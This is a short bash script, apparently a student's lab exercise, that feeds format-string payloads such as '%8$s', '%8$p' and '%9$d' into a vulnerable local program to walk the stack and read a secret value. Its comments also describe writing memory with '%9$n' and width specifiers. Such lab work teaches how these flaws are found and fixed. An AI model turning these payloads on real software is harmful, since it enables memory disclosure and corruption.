#!/bin/bash
v=41
#echo -e $x "\x41\x41\x41\x41.%10\$d" | ./formatstring

echo "Looping through to view stack"

for i in {1..10}
do
    echo -e $v "%$i\$d" | ./formatstr-root
    echo "done $i"
    echo " "
done

echo " Reach input integer using format string direct access %9\$d"
echo -e $v "%9\$d" | ./formatstr-root
echo " "


echo "Secret is 0x44 = 'D' which appeared at the 8th iteration, use format string direct access %8\$s"
echo -e $v "%8\$s" | ./formatstr-root
echo " "

echo "%x reads the hex value, which matches the secret address"
echo -e $v "%8\$p" | ./formatstr-root

# task 1
# reading address of inserted integer %9$s
# writing address of inserted integer 12345%9$n or %100x%9$n (width specifier to avoid long strings)
